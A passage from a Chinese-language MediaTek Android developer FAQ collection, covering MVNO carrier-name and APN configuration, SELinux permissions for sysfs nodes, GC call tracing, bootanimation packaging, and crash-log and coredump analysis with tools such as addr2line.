String newnumber = '\u202D' + subnumber + '\u202C';
text = text.toString().replace(subnumber, newnumber);
}

}

///add this code

// If suggestions are not enabled, remove the suggestion spans from the text
```

## [知识点]  [FAQ09811]  [NW] 如何区分MNO和MVNO

```text
MVNO(Mobile Virtaul Network Operator)虚拟网络运营商，没有自己的实体网络，通过租用MNO(Mobile Network Operator)的网络来提供网络服务。
我们知道Spec规定operator之间是通过MCC/MNC （Mobile Country Code/Mobile Network Code）来区分的；而MVNO和对应MNO的MCC/MNC是相同的，那就需要MVNO定义额外的栏位（通常都是SIM卡中某支文件）来和对应MNO做区分；具体这个额外的栏位是什么是每个MVNO自己定义的，需要向MVNO确认。
 
[SOLUTION] 
 
目前MTK支持区分MVNO的方式有四种（KK以前没有EF_GID1方式），每种包含运营商名称Spn显示和APN两个方面的需求；Spn显示方面每种区分方式对应一个xml的配置表：
1. EF_SPN方式，对应MVNO配置到Virtual-spn-conf-by-efspn.xml中
2. EF_IMSI方式，对应MVNO配置到Virtual-spn-conf-by-imsi.xml中
3. EF_PNN方式，对应MVNO配置到Virtual-spn-conf-by-efpnn.xml中
4. EF_GID1方式，对应MVNO配置到Virtual-spn-conf-by-efgid1.xml中
 
需要向MVNO确认的信息如下：
1. 区分方式是以上哪种，从而决定相关信息需要配置到哪个xml中
2. MVNO的MCC/MNC是什么
3. MVNO的区分栏位的值是什么
4. MVNO需要显示成什么
5. MVNO是否有自己的APN需要配置（还是直接使用对应MNO的），如果需要，值是什么
 
KK以前（JB*.MP）:
一 SPN的设定：
 
(1)通过EF_SPN区分
这中方式是读取SIM中的文件EF_SPN，结合SIM的mccmnc+spn,在virtual-spn-conf-by-efspn.xml 中查找有没有对应的记录，如果有这表示这个SIM是MVNO的卡，同时取name字段的内容当作运营商名称。
如果知道MVNO的SIM卡中的SPN是“abc”，MNO的MCC/MNC是10000，期望显示运营商名是”MVNO“，那就这样加记录(在Virtual-spn-conf-by-efspn.xml中)
<virtualSpnOverride mccmncspn="10000abc“ name="MVNO">
 
(2)通过EF_IMSI区分
这中方式是imsi中有一段特殊的数字标识用于和MNO区分
例如MNO的MCC/MNC是46692，MVNO的IMSI是466923302848289，IMSI的第9位(注意：是0 base, 所以index要填08)起连续2个数字为特殊标识(28)，期望显示的运营商名称是“MVNO”，那就这样加记录(Virtual-spn-conf-by-imsi.xml中)
<virtualSpnOverride mccmnc="46692" index="08" length="02" pattern="28" name=“MVNO”>
 
(3)通过EF_PNN区分
EF_PNN是SIM中的一个option的文件，里面存放一组网络运营商名称(PLMN Network Name)。这种方式即是读取EF_PNN中的第一个pnn来匹配。如果MNO的MCC/MNC是10000，MVNO中EF_PNN的第一个pnn是“abc”，期望显示的运营商名称是“MVNO”，那就这样加记录(Virtual-spn-conf-by-efpnn.xml中)
<virtualSpnOverride mccmncpnn="10000abc“ name="MVNO">
 
 
二 APN的设定
其对应的文件是apns-conf.xml，和spn-conf.xml相同的目录。对比SPN，APN就简单许多，APN填写和SPN区分选择有联系。 这里举例说明，原MNO的APN的设定
 <apn carrier="Orange Entreprise"
      mcc="100"
      mnc="00"
      apn="MNO的apn"
      user="MNO的user"
      password="MNO的password"
      type="default,supl"
  />
 
(1)通过EF_SPN区分
区分是通过spn字段，和spn记录中的spn字段相同
假如spn中MVNO对应记录是<virtualSpnOverride mccmncspn="10000abc“ name="MVNO">;
 <apn carrier="Orange Entreprise"  <<设定中显示的名称
      mcc="100"
      mnc="00"
      spn="abc" <<增加这个字段
      apn="MVNO的apn"
      user="MVNO的user"
      password="MVNO的password"
      type="default,supl"
  />
 
(2)通过EF_IMSI区分
通过imsi的pattern区分，和spn中的pattern相同。
假如spn中的MVNO记录是<virtualSpnOverride mccmnc="46692" index="08" length="02" pattern="28" name=“MVNO”>
那这个对应的MVNO的AP是
 <apn carrier="Orange Entreprise"  <<设定中显示的名称
      mcc="100"
      mnc="00"
      imsi="28" <<增加这个字段
      apn="MVNO的apn"
      user="MVNO的user"
      password="MVNO的password"
      type="default,supl"
  />
 
(3)通过EF_PNN区分
区分是通过pnn字段，和spn记录中的pnn字段相同
假如spn中MVNO对应记录是<virtualSpnOverride mccmncpnn="10000abc“ name="MVNO">;
 <apn carrier="Orange Entreprise"  <<设定中显示的名称
      mcc="100"
      mnc="00"
      pnn="abc" <<增加这个字段
      apn="MVNO的apn"
      user="MVNO的user"
      password="MVNO的password"
      type="default,supl"
  />
 
KK以后（包含KK）：
一 SPN的设定：
所有MVNO区分方式的virtual xml的构成都应该是mccmnc+pattern
 
(1)通过EF_SPN区分
这中方式是读取SIM中的文件EF_SPN，结合SIM的mccmnc+spn,在virtual-spn-conf-by-efspn.xml 中查找有没有对应的记录，如果有这表示这个SIM是MVNO的卡，同时取name字段的内容当作运营商名称。
如果知道MVNO的SIM卡中的SPN是“abc”，MNO的MCC/MNC是10000，期望显示运营商名是”MVNO“，那就这样加记录(在Virtual-spn-conf-by-efspn.xml中)
<virtualSpnOverride mccmncspn="10000abc“ name="MVNO">
 
(2)通过EF_IMSI区分
这中方式是imsi中有一段特殊的数字标识用于和MNO区分
例如MNO的MCC/MNC是46692，MVNO的IMSI是466923302848289，IMSI的第9位起连续2个数字为特殊标识(28)，期望显示的运营商名称是“MVNO”，那就这样加记录(Virtual-spn-conf-by-imsi.xml中)
<virtualSpnOverride imsipattern="4669246692×××28×××××" name=“MVNO”>
 
(3)通过EF_PNN区分
EF_PNN是SIM中的一个option的文件，里面存放一组网络运营商名称(PLMN Network Name)。这种方式即是读取EF_PNN中的第一个pnn来匹配。如果MNO的MCC/MNC是10000，MVNO中EF_PNN的第一个pnn是“abc”，期望显示的运营商名称是“MVNO”，那就这样加记录(Virtual-spn-conf-by-efpnn.xml中)
<virtualSpnOverride mccmncpnn="10000abc“ name="MVNO">
 
(4)通过EF_GID1区分
EF_GID1是SIM中的一个option的文件，里面存放了n个byte的数据；如果MNO的MCC/MNC是10000，MVNO的EF_GID1的内容是"11"，期望显示的运营商名称是"MVNO"，那就这样加记录(Virtual-spn-conf-by-efgid1.xml中)
<virtualSpnOverride mccmncgid1="1000011" name="MVNO">
 
二 APN的设定
其对应的文件是apns-conf.xml，和spn-conf.xml相同的目录。对比SPN，APN就简单许多，APN填写和SPN区分选择有联系。 这里举例说明，原MNO的APN的设定
 <apn carrier="Orange Entreprise"
      mcc="100"
      mnc="00"
      apn="MNO的apn" 
      user="MNO的user"
      password="MNO的password"
      type="default,supl"
  />
 
(1)通过EF_SPN区分
区分是通过spn字段，和spn记录中的spn字段相同
假如spn中MVNO对应记录是<virtualSpnOverride mccmncspn="10000abc“ name="MVNO">;
 <apn carrier="Orange Entreprise"  <<设定中显示的名称
      mcc="100"
      mnc="00"
      apn="MVNO的apn"
      user="MVNO的user"
      password="MVNO的password"
      type="default,supl"
      mvno_type="spn"                  <<增加这两个字段
      mvno_match_data="abc"
  />
 
(2)通过EF_IMSI区分
通过imsi的pattern区分，和spn中的pattern相同。
假如spn中的MVNO记录是<virtualSpnOverride imsipattern="4669246692×××28×××××" name=“MVNO”>
那这个对应的MVNO的APN是
 <apn carrier="Orange Entreprise"  <<设定中显示的名称
      mcc="100"
      mnc="00"
      apn="MVNO的apn"
      user="MVNO的user"
      password="MVNO的password"
      type="default,supl"
      mvno_type="imsi"                  <<增加这两个字段
      mvno_match_data="46692×××28×××××"
  />
 
(3)通过EF_PNN区分
区分是通过pnn字段，和spn记录中的pnn字段相同
假如spn中MVNO对应记录是<virtualSpnOverride mccmncpnn="10000abc“ name="MVNO">;
 <apn carrier="Orange Entreprise"  <<设定中显示的名称
      mcc="100"
      mnc="00"
      apn="MVNO的apn"
      user="MVNO的user"
      password="MVNO的password"
      type="default,supl"
      mvno_type="pnn"                  <<增加这两个字段
      mvno_match_data="abc"
  />
 
(4)通过EF_GID1区分
区分是通过gid1字段，和spn记录中的gid1字段相同
假如spn中MVNO对应记录是<virtualSpnOverride mccmncgid1="1000011" name="MVNO">;
 <apn carrier="Orange Entreprise"  <<设定中显示的名称
      mcc="100"
      mnc="00"
      apn="MVNO的apn"
      user="MVNO的user"
      password="MVNO的password"
      type="default,supl"
      mvno_type="gid"                  <<增加这两个字段, 注意是gid而不是gid1
      mvno_match_data="11"
  />
 
 
 
有些地区的MVNO要求忽略国内漫游（national roaming），如果有此需求可以参考：
ID: FAQ11783
[NW] MVNO忽略国内漫游（ignore national roaming）
 
如果按照上述配置后，锁屏界面/下拉列表界面 显示的名字和配置的不同，可能按照spec显示了更高优先级的名字，比如NITZ/EONS…

遇到这类问题属于网络运营商名称显示，可以同时参考如下FAQ：

ID: FAQ08919
[NW] 网络运营商名称显示规则（锁屏界面，下拉列表）---网络名称 客制化方法 和 问题处理flow
```

## [FAQ13635]  Android L APP 如何获取sys file system 中节点的写权限

```text
Google 默认禁止app , 包括system app, radio app 等直接写/sys 下面的文件, 认为这个是有安全风险的。如果直接放开SELinux 权限, 会导致CTS 无法通过.

通常遇到此类情况，你有两种做法:
(1). 通过system server service 或者 init 启动的service 读写, 然后app 通过binder/socket 等方式连接APP 访问. 此类安全可靠, 并且可以在service 中做相关的安全审查, 推崇这种方法.

(2). 修改对应节点的SELinux Security Label, 为特定的APP, 如system app, radio, bluetooth 等内置APP开启权限, 但严禁为untrsted app 开启权限. 具体的做法下面以 system app 控制/sys/class/leds/lcd-backlight/brightness 来说明.

1. 在device/mediatek/common/sepolicy/file.te 定义brightness SELinux type
type sys_lcd_brightness_file, fs_type,sysfs_type;

2. 在device/mediatek/common/sepolicy/file_contexts 绑定 brightness 对应的label, 注意对应的节点是实际节点，而不是链接.以及整个目录路径中也绝不能包含链接(无数同仁有犯这个错误，特意提醒)
/sys/devices/platform/leds-mt65xx/leds/lcd-backlight/brightness u:object_r:sys_lcd_brightness_file:s0

3. 在device/mediatek/common/sepolicy/system_app.te 中申请权限.
allow system_app sys_lcd_brightness_file:file rw_file_perms;

4. 为其它的process 申请相关的权限，如system_server, 在device/mediatek/common/sepolicy/system_server.te
allow system_server sys_lcd_brightness_file:file rw_file_perms;

原则上我们都推崇使用第一种方式处理.
```

## [FAQ18956]  如何追踪上层调用GC的位置

```text
因为GC会让进程suspend起来，所以某些时候如果java层有调用GC，那么就会对系统的performance有影响。这时候需要找出是哪个位置调用 GC的。找到调用GC的方法如下：

修改代码，如下黄色部分代码所示：

/art/runtime/gc/heap.cc

 2383collector::GcType Heap::CollectGarbageInternal(collector::GcType gc_type, GcCause gc_cause, 
2384                                               bool clear_soft_references) {
2385  Thread* self = Thread::Current();
2386  Runtime* runtime = Runtime::Current();
2387  // If the heap can't run the GC, silently fail and return that no GC was run.
// mtk add begin
{
   ReaderMutexLock mu(self, *Locks::mutator_lock_);
            Thread* self = Thread::Current();
            self->Dump( LOG(WARNING)<<"uncaughtException happend" );
}
// mtk add end
2388  switch (gc_type) {
2389    case collector::kGcTypePartial: {
2390      if (!HasZygoteSpace()) {
2391        return collector::kGcTypeNone;
2392      }
2393      break;
2394    }
2395    default: {
2396      // Other GC types don't have any special cases which makes them not runnable. The main case
2397      // here is full GC.
2398    }
2399  }

2.采用模块化编译，只编译libart.so即可（在art/runtime目录下面有android.mk文件，所以可以进到这个目录里面进行mm操作）

3.将上面的生成的32位libart.so和64位的libart 分别push到/system/lib和system/lib64/目录下面

4.重启手机，并复现问题

然后，提供mtklog，这时候，在mainlog中就会有GC的函数调用栈。
```

## [gps]  [FAQ13246]  GPS问题分类--MTK ALPS GPS的特殊知识

```text
1.FULL start、COLD start、WARM start、HOT start这些启动方式是什么意思?
定位过程中最重要的辅助资讯包括时间、位置、星历。

FULL start：没有任何的辅助资讯。相当于end user第一次买到手机后使用定位应用的场景。
COLD start：有时间辅助资讯，end user不会遇到该场景。
WARM start：有时间、位置辅助资讯，end user此次定位距离上次定位超过2～4个小时。
HOT start：有所有的辅助资讯，end user此次定位距离上次定位小于2～4小时。

所以对于end user经常会遇到的场景是WARM/HOT start。

2.各种启动方式的TTFF是多少?
TTFF的结果和测试环境、测试的手法、硬件的GPS 性能强相关。
MTK给出的数据是基于在open sky的环境下，有6颗卫星SNR》40db。
FULL start TTFF：小于50s。
COLD start TTFF：小于40s。
WARM start TTFF：小于35s。
HOT start TTFF：小于5s。
```

## [语言]  [默认值]  [FAQ18381]  [APP] 语音控制的语言选项默认是汉语，如何将默认设置为English?

```text
进入“设置>语言和输入法> 语音控制”，默认语音控制语言为汉语，如何改为默认语音控制语言为English?

请在vendor/mediatek/proprietary/packages/apps/VoiceCommand/res/xml/voicelanguage.xml文件中进行修改：

<?xml version="1.0" encoding="UTF-8"?>
<Languages>
<Language TypeName="简体中文" ID="1" Code="zh-CN" FileName="keyword/1.xml" />
<Language TypeName="繁體中文" ID="2" Code="zh-TW" FileName="keyword/2.xml" />
<Language TypeName="English" ID="3" Code="en-US" FileName="keyword/3.xml" />
<DefaultLanguage ID="1" />
</Languages>

请修改代码如下：<DefaultLanguage ID="3" />。
```

## [log]  [FAQ14027]  如何直接打开aee db文件?

```text
当发生异常后，除了有mtklog外，还有aee_exp目录下的db，很多异常分析都是基于db的。db是一个压缩的2进制文件，无法直接打开。
GAT里的logviewer可以直接打开解压，但是操作繁琐，这里提供一个直接双击打开db的方法。

[SOLUTION] 
在windows操作系统上，可以将某个文件关联一个应用程序，双击这个文件就可以启动该应用程序打开。比如txt文件，双击后notepad.exe会打开txt文件。
那么db关联的应用程序是什么么?是aee_extract.exe，这个工具在gat-win32-3\prebuilt\spsstools\bin\aee_extract.exe。
请使用最新版本的GAT（版本至少是3.15），将*.dbg文件关联到 aee_extract.exe 就可以双击打开解压db了。
关联有很多方法：比如双击db，选择应用程序，勾选永久使用该程序打开就可以了。
```

## [bootanimation]  [FAQ10590]  如何预置规范的动画包?

```text
一、保证bootanimation.zip压缩包下的图片Size和格式完全统一

二、请写规范的配置文件desc.txt
desc.txt每个参数的实际意义，以如下的case为例：
480 854 10
p 1 0 part0
p 0 0 part1

1.第一行的参数前两位480和854分别表示要显示动画的width和height. 默认情况下应该与Display的width和height一致，如果设置比Display的size要小，则动画会居中显示，周边将用黑框填充.
2.第一行的第三个参数10是定义动画播放的预订帧率(FPS),这个帧率fps是指：每秒动画播放的帧数。此帧数是一个理想值，并不一定代表动画实际帧率，假设预订帧率为FPS_I，预订每一帧解析的时间t_I,  则t_I=1/FPS_I。实际帧率的规则是：
假设某一帧从解析到渲染耗时为t_r，当t_r<=t_l，则渲染完这一帧后，动画这个thread会sleep(t_l-t_r)的时间，也就说这一帧最后的耗时就t_l；
假设某一帧从解析到渲染耗时为t_r，当t_r>t_l，则渲染完这一帧后，动画这个thread会马上开始下一帧，也就说这一帧最后的耗时就t_r。
所以，desc.txt内设置的这个帧率并不能代表动画的实际帧率，实际的帧率是和系统开机的performance有关，因此不是说在desc.txt设置帧率越大越好，反而容易出现当某一帧耗时较长，就容易给用户某一帧卡顿的体验，目前这个FPS的值一般设置在13左右。
当然，设置FPS为13并不是说系统的performance比较低，本身在开机动画阶段，系统进入Bootup Android阶段，许多进程需要启动，系统的主要工作应该集中与开机启动的进程，因此不建议动画的图片过于复杂，导致系统开机的Performance变差。

3.第二行和第三行情况类似，一般用于分别设置顺序播放和无限循环播放的相关参数.
第一个参数p是google default的设计，请保留以p开头。
第二个参数1表示这一行对应folder所需要循环播放的次数，如果是0则表示是无限循环播放，直到系统ready后通过被动退出。
第三个参数0表示这一行对应folder里面的每一帧图片依次解析渲染完成后，要进入下一个循环，动画这个线程需要pause多久。
第四个参数part0表示对应设置规则的folder的path。

Note1：默认的设计，都是将顺序播放的动画放在一个folder，定义这个folder所需要循环的次数；在无限循环的folder内放置一张图片，保证动画没有收到退出指令的时候，动画可以一直显示.
Note2:由于循环播放的folder中的每帧都是以纹理对象存储在纹理内存中再upload到GPU做渲染的，以便下次循环播放不需要重新解析.如果动画包中的图片太多或者图片的size很大时，则会导致占用较多的memory,因此为保证开机的performance,开机动画不建议太复杂.
```

## [bootanimation]  [FAQ06044]  制作开机动画(bootanimation.zip)注意事项

```text
bootanimation.zip是开机动画的图片压缩包，里面放的都是一帧一帧的图片。
注意：里面除了desc.txt以外不能存在其他非图片格式的文件，否则会引起bootanimation程序崩溃，崩溃的log示例如下：
可以看到在播放Thumbs.db时发生了bootanimation的NE
[SOLUTION] 
不要在windows系统下打包bootanimation.zip，因为如果浏览图片后，windows将会生成隐藏文件Thumbs.db，请在linux下打包
```

## [FAQ13768]  功耗问题eservice提交流程

```text
因为功耗问题很多情况下会涉及到HW/SW多个模块，
因此在Mediatek内部，功耗问题的处理流程有一定的规则。
 
如果客户在提交eservice的时候能遵循如下的规则，
那么在Mediatek这边问题会处理得更加顺利，对提高问题处理效率会有显著帮助

(1) 飞行模式底电流
A: 如果漏电小于10mA-------->同时提交HW/SW的eservice
B: 如果漏电大于10mA-------->提交SW的eservice
 
(2) 飞行模式平均电流-------->提交SW的eservice
 
(3) 传导待机/通话功耗
*先保证飞行模式功耗正常
A: 如果某些band有问题（比如2g fail，3/4g ok）-------->提交RF的eservice
B: 如果所有的band都有问题-------->提交SW的eservice
 
(4) 实网待机/通话功耗
*先保证传导功耗正常
A: 如果联网/选网/通话功能存在异常（modem不正常）-------->提交RF的eservice
B: 如果正常附着网络各项功能正常-------->提交SW的eservice
 
(5) wireless connecivity相关功耗问题（wifi，BT，GPS，FM，NFC）
A: 如果打开飞行模式，再单独打开其中某个模块功耗异常-------->提交SW的eservice（标题里写明是哪个模块的功耗问题，比如“wifi功耗”）
B: 如果只有在关闭飞行模式的情况下，功耗才会异常（说明跟modem有一定关联）-------->按照(4)的流程处理
C: 如果涉及某个模块的非常专业的测试（其他模块的人可能看不懂）-------->提交SW的eservice (标题里写明测试项，比如“wifi XXX测试”)
```

## [FAQ18817]  【MediaScanner】手机开启加密后，一些内置文件在down完版本后第一次开机搜索不到，重启后正常

```text
手机开启加密后，内置的文件在down完版本后第一次开机搜索不到，重启后正常。
修改 MediaScannerReceiver.java
1. 增加定义 
private static final String DECRYPT_STATE = "trigger_restart_framework";
 
2. 修改 getHandler()
private Handler getHandler() {
    if (sHandler == null) {
        sHandler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                Context context = (Context) msg.obj;
                int waitTime = msg.arg1;
                MtkLog.v(TAG, "Check whether all storage mounted, have waited " + waitTime + "ms");
                if (MSG_CHECK_ALL_STORAGE_MOUNTED == msg.what) {
                    /// When all storage mounted or check time out, begin to scan
                    // modify start
                    // if (waitTime > TIMEOUT_VALUE || isAllStorageMounted(context)) {
                    if (DECRYPT_STATE.equals(SystemProperties.get("vold.decrypt"))&& (waitTime > TIMEOUT_VALUE || isAllStorageMounted(context))) {
                        // modify end
                        MtkLog.v(TAG, "All storages have mounted or check time out, begin to scan.");
                        scan(context, MediaProvider.EXTERNAL_VOLUME);
                        removeCallbacksAndMessages(null);
                        sHandler = null;
                    } else {
                        MtkLog.v(TAG, "Some storage has not been mounted, wait it mounted until time out.");
                        Message next = obtainMessage(msg.what, waitTime + CHECK_INTERVAL, -1, msg.obj);
                        sendMessageDelayed(next, CHECK_INTERVAL);
                    }
                    //}
                }
            };
        }
        return sHandler;
    }
    /// @}
}
```

## [log]  [FAQ14783]  ZZ_INTERNAL每个栏位的含义

```text
异常分析是基于exp db的，db的类型多种多样，除了db文件名可以表明粗略的异常类型外，还有ZZ_INTERNAL文件里的内容也做了粗略的分类。
现在有些基于后台收集db的机制，面对大量的db，需要做不同目标的分类，ZZ_INTERNAL是很好的参考源，因此熟悉这个文件的内容格式就很重要了。
 
ZZ_INTERNAL包含10列，每1列用逗号隔开。举例如下：
Hardware Reboot,0,0,99,/data/core/,0,,HW_REBOOT,Tue Aug  4 21:42:18 CST 2015,1
 
以下是各列详解：
第1列：exception class，有KE/NE/JE/EE等。所有类型都定义在：alps/kernel-3.10/include/linux/aee.h
AE_EXP_CLASS
枚举类型里，除了AE_RESMON,AE_MODEM_WARNING是Mediatek内部使用外，其他都有。
System API DUMP是native layer主动报出的问题，对应AE_SYSTEM_NATIVE_DEFECT，
Kernel API Dump是Kernel layer主动报出的问题，对应AE_KERNEL_PROBLEM_REPORT。
Manual Dump是同时按上下音量键5s/10s左右触发的。

第2列：pid，如果没有该信息则为0或者0xAEE00000(-1361051648)
第3列：tid，如果没有该信息则为0或者0xAEE00000(-1361051648)
第4列：固定是99
第5列：固定是/data/core/
第6列：exception level，0: fatal, 1: exception, 2: warning, 3: reminding。定义在：alps/kernel-3.10/include/linux/aee.h
AE_DEFECT_ATTR

第7列：exception type info string
如果是NE，则这个栏位是signal名称，比如：SIGSEGV，KE则为空，SWT则为：system_server_watchdog，等等。

第8列：module name or process name
e.g. KE db可能为KE at <function>

第9列：UTC time
第10列：固定是1
 
aee部分可以到DCC上参考Mediatek Logging SOP.pptx。
```

## [log]  [FAQ11598]  如何处理工厂模式(factory mode)崩溃的问题?

```text
工厂模式下系统会跑到kernel，并运行factory程序，如果factory发生NE崩溃了，该如何分析处理?此时可没有mtklogger在抓取log的。
 
如果factory发生NE崩溃，kernel会按默认处理，将生成coredump，文件存放在/data/core/目录下，文件名为zcore-xxx.zip，其中xxx为factory的pid
此时提供该zcore-xxx.zip和保留的out/target/product/$proj/symbols/system/bin/factory一起提交到e-service。
 
note:
如果发现/data/core/目录下没有该文件，请在alps/device/mediatek/MT67xx/factory_init.rc文件中添加
import init.aee.rc
```

## [log]  [FAQ09747]  对于没有coredump的Native exception，如何抓取coredump

```text
关于什么是coredump请参考FAQ (ID: FAQ06108) COREDUMP ；
coredump对于定位应用NE死在代码的什么位置，以及当时的死机现场至关重要；
所以对于NE issue大部分是否都需要帮忙抓取coredump来分析；
所以抓到log发现是NE issue后，请用GAT解开DB，来查看下面的文件mtklog/aee_exp/db.xx/PROCESS_COREDUMP是否存在；
但是有少数情况下会出现抓取不到的现象，针对此情况，请按照下面的方法来抓取； 
 
1.对于GB3/JB3以前的版本
(1)删除手机中system/bin/debuggerd,
(2)重启手机,然后手动设置adb shell
    然后执行:
    echo "|/system/bin/aee_core_forwarder /data/core/ %p %s UID=%u GID=%g"   > /proc/sys/kernel/core_pattern
    (注意如果每次重启手机都要设置一次)
(3)然后复现问题，这样coredump会生成到/data/core/目录下。
(4)复现后，捞出/data/core目录里的文件， coredump就在这里
2.对于GB3/JB3及以后的版本
1. eng build 默认都有coredump 在mtklog/aee_exp 文件夹中db，解压db文件后可以看到
2. 如果需要在user build下抓取coredump，请按以下设置，然后抓取，也会在mtklog/aee_exp 文件夹中db
    adb shell aee -d coreon
    adb shell reboot
```

## [log]  [FAQ06108]  /data/core/zcore-xxx.zip是什么?有什么用?

```text
1. zcore-xxx.zip是压缩的coredump,文件名叫做PROCESS_COREDUMP
2. coredump是linux的概念，在应用层的程序发生崩溃后，linux会将当前的进程空间保存为coredump，以供后续分析(可以用gdb等工具分析)，详细信息可以到网络搜索资料
在android系统中，也会将natvie程序崩溃(native exception，简称NE)而产生的coredump保存到/data/core目录下，原本的保存的文件名一般为core.$pid,其中$pid为崩溃进程的pid
3. 一般coredump文件都很大，因此MTK将其压缩，名字叫zcore-$pid.zip
4. 在JB2之前该文件直接解压就可以拿到PROCESS_COREDUMP，之后则需要GAT解压（目前还没做好）
5. 正常情况下的NE，MTK会生成相应的mtklog/aee_exp/db.xx，会将PROCESS_COREDUMP一起打包进去，而不会生成/data/core/zcore-xxx.zip,除非特殊情况才会生成到/data/core目录下，比如MTK异常处理机制本身异常了
6. user版本即使发生NE也不会生成zcore-xxx.zip，所以不用当心
7. 如果经常发生NE的话，可能导致/data/core目录下存在很多zcore-xxx.zip,把占用大量的data空间。此时应该将发生NE的问题解决，然后在清除zcore-xxx.zip
```

## [log]  [FAQ14333]  异常发生后如何将log里对应的地址转换为所在的文件和行号?

```text
在发生各种异常时，通常从log看到的是各种地址和数据，这些信息基本无法阅读，分析也很困难。
我们需要将这种人类无法阅读的信息转换成容易理解的信息。比如将函数地址转换成所在的文件和行号。
在log里恰恰含有大量这种地址信息。因此转换为所在文件和行号有助于我们分析问题。
 
[SOLUTION] 
这个转换需要借助一个GNU工具：arm-linux-androideabi-addr2line（ARM 32位版本）或aarch64-linux-android-addr2line（ARM 64位版本）
工具位置（具体以实际目录位置为准）：
ARM 32位版本：prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.8/bin/arm-linux-androideabi-addr2line
ARM 64位版本：prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin/aarch64-linux-android-addr2line
使用方法：
arm-linux-androideabi-addr2line -Cfe $symbol_file 0xyyyyyyyy
其中的0xyyyyyyyy是从log提取的地址。$symbol_file为地址所在的符号文件，该文件包含调试信息。
 
该工具需要搭配对应的符号文件才行，那这个符号文件是什么呢?这要看你要查询的地址是属于哪个符号文件的了。
举例：log里的地址是lk的，那lk对应的符号文件是：out/target/product/$proj/obj/bootloader_obj/build-$proj/lk
如果是kernel的，对应的符号文件是：out/target/product/$proj/obj/kernel_obj/vmlinux（老版本的位置在kernel/out/vmlinux）
如果是preloader的，对应的符号文件是：out/target/product/$proj/obj/preloader_obj/bin/preloader_$proj.elf
 
实例1：
有一次在lk里发生了重启，抓取uart log如下：
kedump add: SYS_MINI_RDUMP[0]  1000/1000@a00
[1460]  data abort, halting
[1460]  r0 0x41e49ec8 r1 0x41e31b03 r2 0x41e49ed7 r3 0x00000000
[1460]  r4 0x43ff0000 r5 0x43ff0bae r6 0x41e31b04 r7 0x43ff0bd6
[1460]  r8 0x41e31ad4 r9 0x00000014 r10 0x00001a00 r11 0x00000000
[1460]  r12 0x00000061 usp 0x00000000 ulr 0x00000000 pc 0x41e1b918
[1460]  spsr 0x00000173
/* 之后就重启了 */
我们需要知道在什么地方发生异常了，PC是当时发生异常的地址。拿到对应的lk，用如下命令转换：
arm-linux-androideabi-addr2line -Cfe lk 0x41e1b918
kedump_to_expdb
bootable/bootloader/lk/app/mt_boot/aee_KEDump.c:219
很明显就可以看到是aee_KEDump.c的219行出问题了，赶紧查看代码分析吧。
 
实例2：
在kernel发生了panic，抓取kernel log（db里的SYS_KENREL_LOG）如下：
[17600.585313] <1>-(1)[1602:wpa_supplicant] PC is at sock_rfree+0x20/0x38
[17600.585327] <1>-(1)[1602:wpa_supplicant] LR is at netlink_skb_destructor+0x14/0x1c
......
[17600.590428] <1>-(1)[1602:wpa_supplicant] Call trace:
[17600.590442] <1>-(1)[1602:wpa_supplicant]  [<ffffffc000832784>]  sock_rfree+0x20/0x38
[17600.590458] <1>-(1)[1602:wpa_supplicant]  [<ffffffc000836cb0>]  skb_release_head_state+0x5c/0xe4
异常发生在sock_rfree()函数里，但是不知道哪一行异常了，异常的地址是ffffffc000832784，拿到对应的vmlinux，转换：
aarch64-linux-android-addr2line -Cfe vmlinux 0xffffffc000832784
sk_mem_uncharge
kernel-3.10/include/net/sock.h:1415
问题在sock.h的1415行异常，需要进一步分析。
 
注意：
这个符号文件必须是和烧录的image一起生成的，如果被重新编译过生成的，那么log里的地址和符号文件可能对应的不上，工具可能输出错误的结果。
如果不确定符号文件是32位还是64位，则直接使用64位版本。
```

## [log]  [FAQ06047]  如何学习Debug Native Exception?

```text
Native Exception，简称NE，是发生于C/C++ code里面最常见的一种异常，对于简单的NE，我们可以根据backtrace印出的调用逻辑来推断产生的原因。但是稍复杂一些的NE，比如memory corruption造成地址访问异常，比如某个变量在多层函数调用之间被异常篡改，比如函数指针未初始化造成的异常跳转等等，仅仅依靠log和backtrace就变得稍显力不从心了。

对于此类case，就需要深入了解architecture相关的知识以及各种相关的工具来进行汇编语言层次的分析。鉴于相关的知识分布比较发散，我们将debug NE需要的相关知识罗列在此供参考学习。
```

## [log]  [FAQ10278]  DB文件会生成在哪里以及生成的个数是多少?

```text
一. DB的路径
DB的路径只有两种路径：/data/aee_exp或者/sdcard/mtklog/aee_exp。其中/sdcard一般是内置sdcard。DB实际存放路径的规则如下：

(1)ENG版本
ENG版本默认是打开MTKLogger，所以一般情况下DB优先放到在/sdcard/mtklog/aee_exp。但是当发生的是KE重启这类异常，此时MTKLogger还没起来，则aee_exp会生成在/data/aee_exp。

(2)USER版本
USER版本默认是关闭MTKLogger，所以此时DB是生成在/data/aee_exp。但是如果在USER版本将MTKLogger打开，则aee_exp是生成在/sdcard/mtklog/aee_exp。

二. aee_exp下的DB个数

USER版本关闭MTKLogger的情况下，只有发生的是Fatal级别的异常才会抓取DB(包含KE，异常reboot，system_server出现异常的JE和NE以及software WatchDog)。且aee_exp最多保存4个DB文件，名称如db.xx.dbg，其中xx为“00”，“01”，“02”，“03”，再发生异常时依次覆盖“01”，“02”，“03”，会一直保留最老的“00”。
除此之外的其它情况下是会抓取包括Exception级别的异常DB，且aee_exp最多会保存20个DB文件(db.00.dbg，db.01.dbg，......db.19.dbg)，再发生异常时依次覆盖“01”，“02”，“03”......"19"，会一直保留最老的“00”。
```

## [FAQ18402]  [SAT] SIM Refresh后STK Name更新太慢

```text
执行SIM refresh 后，若需要更新 STK name, STK name显示更新太慢。 
 
[SOLUTION] 
现象：SIM refresh 后重新初始化 SIM 卡，会上报 set up menu. STK ap 过了很长时间才收到，导致 STK name 更新太慢。 
原因：STK 默认的设计是后台广播，若开机初始化阶段消息太多，导致 STK 广播延时明显。
修改：将stk的广播置为前台广播来规避这个问题，请在catservice.java文件的 broadcastCatCmdIntent 里，在发送广播之前，加上：
intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
    
类似如下情况的问题，若需要较早支持进入 SIM Toolkit, 也可以参考此说明修改：
例如：插入支持 STK SIM，重启手机，当开机弹出运营商提示框后，点击SIM Toolkit应用，提示“App isn't installed”, 过一段时间才能进入。
 
类似问题 log 情况，按时间顺序说明如下：
//开机或 refresh 后，sim 上报的 set up menu 指令，CatService 收到 set up menu.
